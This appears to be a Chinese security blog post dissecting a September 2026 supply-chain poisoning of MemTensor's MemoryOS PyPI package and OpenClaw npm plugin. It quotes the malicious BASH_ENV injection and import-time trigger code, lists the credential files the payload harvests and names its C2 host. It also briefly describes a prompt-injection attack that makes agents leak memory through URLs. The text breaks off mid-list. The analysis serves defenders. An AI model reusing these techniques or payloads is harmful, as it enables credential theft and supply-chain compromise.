---
title: 不用安装，一次import就中招？MemTensor 投毒拆解
url: https://mp.weixin.qq.com/s/LnsfGMb_Olw3fo2ZbJSgMg
source: Doonsec's feed
date: 2026-09-29
fetch_date: 2026-09-30T07:40:43.071272
---

# 不用安装，一次import就中招？MemTensor 投毒拆解

# 不用安装，一次import就中招？MemTensor 投毒拆解

原创

千里
千里

东方隐侠安全团队

![]()

在小说阅读器读本章

去阅读

![]()

在公众号小说中沉浸阅读

9月24日，慢雾发布预警，MemTensor的AI长期记忆工具链遭供应链攻击。受影响的是面向LLM/Agent的开源记忆库MemoryOS（PyPI 2.0.34），以及连接OpenClaw运行时的官方插件`@memtensor/memos-cloud-openclaw-plugin`（npm 0.1.21 / 0.1.23 / 0.1.25）。

这次事件不是简单的"又一个恶意包"或者"供应链攻击"的案例，它突破的是我们对安全的默认假设，我们原本理解投毒需要 install hook、锁版本就能保住供应链、官方维护者发布的包可信，这几个假设这次全被打脸了。有点像 Next.js RCE 让我们意识到静态网站也能接管服务器。

另外这次被攻击的目标是 AI Agent 的记忆层，本身也是目前 AI 工程链路里数据密度最高、权限最泛、监控最薄的一环。

下面按攻击过程回溯、token 怎么丢的、为什么 import 就够、为什么是记忆层、趋势判断、行业建议的顺序来拆。完整版、代码片段和参考来源在官网，文末有链接。

![](https://mmbiz.qpic.cn/mmbiz_png/AwziaxUyibcNhbdMiccfvILGOWKxXd3kH7Pw1xcOftRWAE9F0NKjliclhLibLIBURTDu71XRbPmBEHefPWNfJhUWyGRUdnwianVcDYSCx8Ws0nf00/640?wx_fmt=png&from=appmsg)![]()

![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg)

攻击过程回溯

01

时间线来自 npm/PyPI registry 元数据、GitHub 仓库事件和 commit 记录，全部是可复验的一手数据。2026 年 9 月 23 日 UTC：

| 时间 | 事件 |
| --- | --- |
| 00:48–02:03 | GitHub 账号 `Memtensor-AI` 在 OpenClaw 插件仓库上五次创建、推送、删除分支 `sc/release-0.1.21-20260922-cloud` |
| 02:23 | npm 0.1.21 发布，携带 sckit 二进制 |
| 03:17 | MemTensor/MemOS 仓库出现 commit `b52958f`，加入 sckit 载荷和 CI token 窃取逻辑 |
| 03:45 / 03:49 | npm 0.1.22（干净）、0.1.23（恶意）先后发布 |
| 04:17 | 研究者在仓库提出 Issue #173：这些版本在仓库里找不到对应 commit |
| 04:33 / 04:36 | npm 0.1.24（干净）、0.1.25（恶意）先后发布 |
| 05:24 | commit `41bf5c7` 删除并重建 tag `v2.0.34`，发布 GitHub Release |
| 05:25 | MemoryOS 2.0.34 上传 PyPI |
| 05:55 | tag `v2.0.34-capture-1` 被删除 |

关注几个细节。

第一，npm 上的五个版本是干净和恶意交替的：0.1.21 恶意、0.1.22 干净、0.1.23 恶意、0.1.24 干净、0.1.25 恶意。发布时 `latest` 指向恶意的 0.1.25，任何人执行 `npm install @memtensor/memos-cloud-openclaw-plugin`，装到的就是带后门的版本。交替发布是混淆手段，如果你只抽查了 0.1.22 或 0.1.24，很容易得出"没问题"的结论。

第二，五个版本都来自同一个 npm 账号 `leason1974`，这个账号之前发布过完全合法的 0.1.20。所以这不是抢注，也不是域名仿冒，是真实的发布凭据被劫持后，从官方渠道发出来的"正版"。

第三，PyPI 侧的 MemoryOS 2.0.34，wheel 体积从 2.0.33 的 951 KB 膨胀到 19 MB，里面多了六个跨平台 Go 二进制，覆盖 linux/darwin/windows 的 amd64/arm64。那个被删除的 `v2.0.34-capture-1` tag，说明攻击者分了捕获和投毒两个阶段。

第四，两个仓库的 GitHub Actions 运行记录都被清空了，攻击发生前的最后一条记录停在 9 月 7 日。日志消失，意味着攻击者有仓库级权限，也意味着事后取证只能完全依赖 registry 侧的元数据。

最先发现异常的是社区研究者在 Issue #173 指出 0.1.21 和 0.1.23 与仓库里任何 commit 都对不上，随后 SafeDep 的威胁情报系统监控到这个 issue，下载了当天发布的全部版本和最后一个干净版本做比对，才把整条攻击链拉出来。

又要回归那句草台班子的结论，在如今这个时代，哪怕没有 AI 加持，像这种投毒的告警竟然还是缺失的。

![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg)

发布 token 是怎么丢的

02

攻击者攻击的第一环是发布者。如果发布者的 token 没泄露，这一劫大概能躲过去。那 token 怎么丢的？

又要聊回让今年供应链投毒爆炸的 npm。npm 这一侧，OpenClaw 插件通过 GitHub Actions 发布，发布步骤从仓库 secret 里取 `NPM_TOKEN`。攻击者在一段短生命周期分支上改了一个发布校验脚本 `validate-release-confirmation.mjs`，改动只有三行：

```
if (env.GITHUB_ENV) {
  appendFileSync(env.GITHUB_ENV,
    `BASH_ENV=${process.cwd()}/.github/scripts/sckit-publish-bridge.sh\n`, "utf8");
}
```

这三行把 `BASH_ENV` 写进了 `$GITHUB_ENV`。GitHub Actions 的机制是，写入 `$GITHUB_ENV` 的变量对后续所有步骤可见，而 Bash 在执行任何非交互脚本前，会先运行 `BASH_ENV` 指向的文件。攻击者靠环境变量注入，让自己的脚本在任何后续步骤之前执行，包括真正持有 token 的发布步骤。

![](https://mmbiz.qpic.cn/mmbiz_png/AwziaxUyibcNhtBOzQVX3XqXwUuPRia8G55hOa7ibLriadYPibFPzB5Hwdw94Tsg2yLpORx1WL3E1jxc8G3wzxJG9HSpnrvNwADx6mHjKbqSWicpQk/640?wx_fmt=png&from=appmsg)![]()

这个研究话题我之前在《Tag即发布权》里聊过，对理解这类"意料之外的操作"有辅助。

这三行代码具体做了什么呢？首先，检查 `PACKAGE_NAME` 是不是目标包、`NPM_VISIBILITY_TIMEOUT_SECONDS` 是不是 150，这个值只有发布步骤会设置，匹配才激活，不匹配直接 return。激活后调用 `collectStageZero()` 把 `NODE_AUTH_TOKEN` 交给 sckit 二进制，然后自删除，`exit 1`。受害者看到的是"发布步骤失败"，一次普通的 CI 失败没人会怀疑，可能调一调再跑一次发现一切正常，皆大欢喜。

而事实上，token 已经到攻击者手里了。

![](https://mmbiz.qpic.cn/mmbiz_png/AwziaxUyibcNia5jlxc7fKRNZAkDTcAKG6ibWHswN0Ar8LKDPxribiaXCJ3COzfgbhdDjdRs4rb4PrnhFdY6BR6l4VRlico4rOSHiaqUlibU9r0m91OQ/640?wx_fmt=png&from=appmsg)![]()

PyPI 侧的路径更精巧，是我认为整个事件里工程水平最高的部分。它利用了一个很多 Python 维护者都没意识到的攻击面：Poetry 的 build-backend 是可以换成仓库内文件的。

攻击者的 commit `b52958f` 改了 `pyproject.toml`，构建后端不再指向官方的 poetry-core，而是指向仓库里的 `sckit_poetry_build.py`。这个文件包装了真正的 Poetry 后端，但在被 import 时执行 `register()`，用同样的 BASH\_ENV 技巧把后续步骤指向 `_pypi_bridge.sh`。这个 bridge 只在 PyPI 发布 action 的容器里激活（它检查 `$0` 是不是 `/app/twine-upload.sh`），拦截 `INPUT_PASSWORD` 和 `PYPI_API_TOKEN`，从 skyleen.fr 子域下载验签过的 emitter（Ed25519 验签是纯 Python 实现，不依赖 runner 上的任何额外包），然后 unset 掉 token 变量，`exit 0`。

两小时后，commit `41bf5c7` 的 message 是 `chore: allow native PyPI upload [skip ci]`，攻击者只删掉 `register()` 那一行调用，让 MemTensor 自己的 CI 用项目真实 token 构建并上传恶意包，62 秒后 MemoryOS 2.0.34 上线 PyPI。

第一阶段偷 token，第二阶段以受害者之名投毒。事后去审计"是谁发布了恶意版本"，答案是 MemTensor 自己的 CI、自己的 token、自己的发布流程。在这种情况下，如果遇到糊涂领导，可能只会归因到受害者。

这里有一个分歧要说清楚：StepSecurity 的静态审查发现，`sckit_poetry_build.py` 里的 `register()` 在他们审查的代码路径中未被调用，Corgea 的定性是"代码存在且有暗示性，但已证实的触发路径是 import 时的 launcher"。二进制证据（`v2.0.34-capture-1` 的 tag 名、精确匹配 twine-upload 的 bridge 逻辑）强烈支持 token 捕获发生过，但严谨起见，CI helper 路径应描述为"高概率执行过"。

![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg)

为什么 --ignore-scripts 救不了你

03

传统 PyPI/npm 投毒的执行模型是 install hook：`setup.py`、postinstall 脚本，在安装瞬间执行。对应的防御也是围绕这个模型建的：`pip --ignore-scripts`、npm 的 `--ignore-scripts`、对 install 脚本的静态扫描。

就在这个背景下，黑天鹅出现了。

npm 侧，恶意版本在 `index.js` 里只加了三处改动：import 一个 `launchStageZero`，在网关启动时调用，在 memory recall 路径再调用一次，并把用户当前的 prompt 文本作为 `SCKIT_EVENT_TEXT` 传进子进程环境。然后 spawn 一个 detached 的平台二进制，`stdio` 全部忽略，`child.unref()`。插件正常工作，后台多了一个进程。

PyPI 侧更直接，`memos/log.py` 的 `configure_logging()` 里插了一个 trigger，几乎所有 import 路径都会走到日志配置，走到就会触发：

```
try:
    from memos._stage0 import trigger
    trigger()
except Exception:
    pass
```

`try/except pass` 保证即使载荷启动失败也绝不影响库的正常功能。你的 Agent 应用 `import memos` 一次，Go 二进制就在后台以独立会话跑起来了。

没有 install hook，`--ignore-scripts` 完全无效。安装是干净的，执行发生在使用时。检测窗口从"安装时"移到了"运行时"，而绝大多数企业的依赖扫描、准入策略、CI 门禁，全部只在安装时把关。理论上这个环境就算打了全部补丁、开了所有安全选项，也可能因为一次普通的 `import` 被攻陷。

载荷本身的能力，结合 SafeDep、Aikido、Socket 的分析看：

* **凭据清点**：`.npmrc`、`.pypirc`、`.git-credentials`、`.netrc`、SSH 私钥、`.vault-token`、`access_tokens.json`，以及环境变量里的 token 类值，配置里 `inventory_roots` 是 `$HOME` 整个目录全盘清点。
* **C2 通信**：三个 skyleen.fr 子域，各带 control/status/batch 路径；协议层用 CBOR 编码、X25519 密钥交换、XChaCha20-Poly1305 加密，支持签名 lease、manifest 和模块化投递。这不是一次性窃取脚本，是模块化 loader 框架——bundle 里的 stage0 只是引导器，后续载荷从 C2 按需下发。
* **自清理**：二进制里有 `scheduleSelfDelete` 和 `deleteExecutable` 例程，配置里有 `not_after` 过期时间戳。运营者在乎痕迹管理。
* **环境适配**：0.1.25 额外加了 `lib/tls-trust.js` 和打包的 `ca-roots.pem`，让 slim 容器这种没有系统证书库的环境也能连上 C2。这个细节说明攻击者对容器化部署（也就是大量 Agent 生产的真实环境）有充分理解。
* **蠕虫逻辑**：Aikido 从二进制里恢复的字符串包括 `prepareRemoteNode`、`prepareRemotePython`、`prepareRemoteWorkflow`，以及直接面向 npm/PyPI 再发布的逻辑，Go module 的名字就叫 `supplychain.local/campaign`。需要说明，这是静态字符串层面的证据，"每个被感染主机都进行了再发布"没有得到证实——但它清楚表明了设计意图：把偷来的凭据变成下一轮包投毒的原材料。窃取和传播是一个闭环，不是两件事。

基于这个毒性，装过恶意版本的主机，都应该按**已沦陷的主机**处理。

![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg)

为什么是记忆工具链

04

供应链投毒今年从加密货币 SDK（偷钱包）和构建工具（偷 CI 凭据）转移到了 AI 相关，这次的目标更是直接瞄准记忆部分。MemoryOS 是给 LLM/Agent 提供长期记忆的基础库，用它的环境几乎必然具备三个特征：有模型 API key、有完整的 Agent 开发栈、有真实的用户数据在记忆流里跑。

memory recall 路径触发时，用户的 prompt 文本被显式地作为 `SCKIT_EVENT_TEXT` 传给了恶意进程。攻击者在载荷层面明确表达了对 prompt 内容的兴趣。如果你读过我写的 LLM key 泄露那篇，会知道有这么一类攻击者正在窃取 LLM key——很显然，这不是一个只偷凭据的窃取者。

这和腾讯朱雀实验室 8 月披露的 Memory Heist 攻击，刚好构成一枚硬币的两面。Memory Heist 走的是推理层：把恶意提示词嵌进网页，诱导 Agent 把记忆里的数据逐字符编码进 URL 路径外泄，全程不经过任何敏感接口，WAF 和 DLP 都看不到，因为对网络层来说那只是一串正常的 GET 请求。而 sckit 走的是供应链层：不再费心诱导 Agent，直接把记忆工具链本身变成 implant。

所以结论很直接：**Agent 的记忆层是一个独立的信任边界，而且是当前整个 AI 栈里防护最薄弱的边界之一。** 它同时具备数据密度高（记忆里存的是用户画像、业务上下文、历史决策）、权限泛（记忆库往往被授予读写 Agent 完整上下文的权限）、部署位置关键（就跑在你的 Agent 进程里）三个属性。攻击者已经从两侧同时进场了。

再加上，现在大家用的记忆插件是 Agent 生态里的"万能连接器"，天然要接入多个运行时（这次是 OpenClaw 网关）、多个模型后端、多种存储。这种"什么都连"的架构定位，意味着它的供应链失陷会横向传导到整个 Agent 栈。你审计了自己用的 LangChain，审计了自己的模型网关，但你的 Agent 记忆，来自一个 9 月 23 日刚发布的 npm 包。

![](https://mmecoa.qpic.cn/mmecoa_png/p7HuDKJB4T17hmgN4ia9GQKG4cKp1tBh6oJW3VxeuBxnh3lPjT9ibFFJCOouHNxa9C3plmiceqkqYta4Ap41IEfLw/640?wx_fmt=png&from=appmsg)

攻击趋势判断

05

* **2026 年 5 月，Shai-Hulud / Mini Shai-Hulud**：攻击者接管维护者账户，向 npm 投毒 3...